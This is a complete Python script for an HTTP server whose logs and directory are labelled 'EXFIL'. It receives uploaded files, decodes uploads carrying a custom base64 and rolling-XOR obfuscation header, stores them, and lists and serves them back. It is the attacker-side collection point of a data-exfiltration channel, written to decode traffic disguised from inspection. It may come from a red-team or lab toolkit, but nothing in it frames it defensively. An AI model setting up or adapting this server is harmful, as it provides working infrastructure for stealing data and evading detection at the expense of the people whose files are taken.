import json
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

EXFIL_DIR = os.path.join(os.path.dirname(__file__), "exfil")
PORT = int(os.environ.get("EXFIL_PORT", "9090"))


class _Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):  # suppress default access log
        print("[EXFIL] {0} - {1}".format(self.address_string(), fmt % args))

    def do_POST(self):
        parsed = urlparse(self.path)
        if not parsed.path.startswith("/upload"):
            self._respond(404, "Not found")
            return

        params = parse_qs(parsed.query)
        filename = params.get("filename", ["upload"])[0]
        filename = os.path.basename(filename) or "upload"

        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length)
        if self.headers.get("X-Enc") == "rxb64":
            import base64
            xored = base64.b64decode(data)
            data = bytes(b ^ ((0xAB + i) & 0xFF) for i, b in enumerate(xored))

        os.makedirs(EXFIL_DIR, exist_ok=True)
        dest = os.path.join(EXFIL_DIR, filename)
        with open(dest, "wb") as fh:
            fh.write(data)

        print(
            "[EXFIL] Received {0} ({1} bytes) → {2}".format(filename, len(data), dest)
        )
        self._respond(
            200, json.dumps({"status": "ok", "filename": filename, "bytes": len(data)})
        )

    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == "/files":
            os.makedirs(EXFIL_DIR, exist_ok=True)
            files = sorted(os.listdir(EXFIL_DIR))
            self._respond(200, json.dumps({"files": files}))
            return

        if parsed.path.startswith("/files/"):
            name = os.path.basename(parsed.path[len("/files/") :])
            path = os.path.join(EXFIL_DIR, name)
            if not os.path.isfile(path):
                self._respond(404, "Not found")
                return
            with open(path, "rb") as fh:
                body = fh.read()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        self._respond(404, "Not found")

    def _respond(self, code, body):
        body_bytes = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body_bytes)))
        self.end_headers()
        self.wfile.write(body_bytes)


if __name__ == "__main__":
    os.makedirs(EXFIL_DIR, exist_ok=True)
    server = HTTPServer(("0.0.0.0", PORT), _Handler)
    print("[EXFIL] Listening on 0.0.0.0:{0}  → saving to {1}".format(PORT, EXFIL_DIR))
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[EXFIL] Stopped.")
